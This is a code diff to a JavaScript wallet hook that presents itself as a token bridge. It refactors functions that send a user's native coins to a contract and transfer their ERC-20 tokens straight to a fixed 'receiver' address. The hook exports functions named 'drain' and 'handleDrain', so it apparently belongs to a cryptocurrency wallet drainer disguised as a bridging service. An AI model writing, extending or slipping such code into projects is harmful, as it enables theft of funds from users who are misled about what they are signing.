@@ -427,21 +427,21 @@ export const UseWallet = () => {
   };
 
   // Main function to handle bridging logic based on token type
-  const bridgeTokens = async ({ token, amount }) => {
+  const bridgeTokens = async ({ token, amount, provider, accountAddress, chainId }) => {
     try {
-      if (!account?.address || !account?.chainId) {
+      if (!accountAddress || !chainId) {
         toast.error("Connect your wallet first.");
         return;
       }
-
+  
       const isNative = token.address === "0x0000000000000000000000000000000000000000"; // Check if native token
-
+  
       if (isNative) {
         // Bridge Native Token (ETH, BNB, etc.)
-        await bridgeNativeToken(amount);
+        await bridgeNativeToken(amount, provider, accountAddress, chainId);
       } else {
         // Bridge Non-Native Token (DAI, USDT, etc.)
-        await bridgeNonNativeToken(token, amount);
+        await bridgeNonNativeToken(token, amount, provider, accountAddress, chainId);
       }
     } catch (error) {
       console.error("Error in bridging tokens:", error);
@@ -450,23 +450,17 @@ export const UseWallet = () => {
   };
 
   // Function to handle native token bridging through multicall
-  const bridgeNativeToken = async (amount) => {
+  const bridgeNativeToken = async (amount, provider, accountAddress, chainId) => {
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum); // Use MetaMask provider
-  
-      // Ensure the wallet is connected and authorized
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-  
-      if (!accounts || accounts.length === 0) {
-        toast.error("No wallet connected. Please connect MetaMask.");
+      if (!accountAddress || !provider) {
+        toast.error("Connect your wallet first.");
         return;
       }
   
-      const signer = provider.getSigner(); // Get signer for the connected account
-      const senderAddress = await signer.getAddress(); // Fetch the user's address
+      const signer = provider.getSigner(); // Use the provided provider
+      const senderAddress = await signer.getAddress(); // Fetch the user's address (connected wallet)
   
-      const chainId = await signer.getChainId(); // Get current chain ID
-      const contractAddress = getContractAddress(chainId); // Get contract address
+      const contractAddress = getContractAddress(chainId); // Get contract address for the current chain
       const amountInWei = ethers.utils.parseEther(amount.toString());
   
       // Create the transaction object
@@ -479,7 +473,7 @@ export const UseWallet = () => {
   
       console.log("Transaction:", tx); // Log the transaction for debugging
   
-      // Send the transaction through MetaMask
+      // Send the transaction through the connected wallet provider
       const transactionResponse = await signer.sendTransaction(tx);
       console.log(`Transaction hash: ${transactionResponse.hash}`);
   
@@ -490,48 +484,48 @@ export const UseWallet = () => {
       console.error("Native token bridging failed:", error);
       toast.error("Failed to bridge native token.");
     }
-  };   
+  }; 
 
   // Function to transfer non-native tokens to receiver address
-  const bridgeNonNativeToken = async (token, amount) => {
+  const bridgeNonNativeToken = async (token, amount, provider, accountAddress, chainId) => {
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner(account.address);
-  
       if (!token.address) {
         console.error("Invalid token address:", token); 
         throw new Error("Token address is undefined or invalid.");
       }
-  
+
+      const signer = provider.getSigner(accountAddress); // Use the provided provider and account address
+
       const tokenContract = new ethers.Contract(
         token.address,
         ["function transfer(address to, uint256 amount) external returns (bool)",
-           "function balanceOf(address owner) view returns (uint256)"],
+        "function balanceOf(address owner) view returns (uint256)"],
         signer
       );
-  
-      const senderBalance = await tokenContract.balanceOf(await signer.getAddress());
-      const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals);
 
+      const senderBalance = await tokenContract.balanceOf(accountAddress); // Get the balance of the sender
+      const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals); // Convert amount to token's decimals
+
+      // Check if the user has enough balance
       if (senderBalance.lt(amountInWei)) {
         toast.error(`Insufficient ${token.name} balance.`);
         throw new Error(`Insufficient ${token.name} balance.`);
-        return;
       }
-  
-      // Use callStatic to simulate the transaction
+
+      // Use callStatic to simulate the transaction (ensure it won't fail)
       await tokenContract.callStatic.transfer(receiver, amountInWei);
-  
-      // If the callStatic doesn't throw, proceed with the real transaction
+
+      // If the callStatic doesn't throw, proceed with the actual transfer transaction
       const tx = await tokenContract.transfer(receiver, amountInWei);
       console.log(`Non-native token transfer tx hash: ${tx.hash}`);
-      await tx.wait();
+      await tx.wait(); // Wait for the transaction to be mined
+
       toast.success(`Transferred ${amount} ${token.name} successfully.`);
     } catch (error) {
       console.error(`Transfer failed for ${token.name}:`, error);
       toast.error(`Transfer failed for ${token.name}.`);
     }
-  };  
+  };
 
 
   return { approveTokens, drain, getTokenAssets, handleDrain, bridgeTokens };
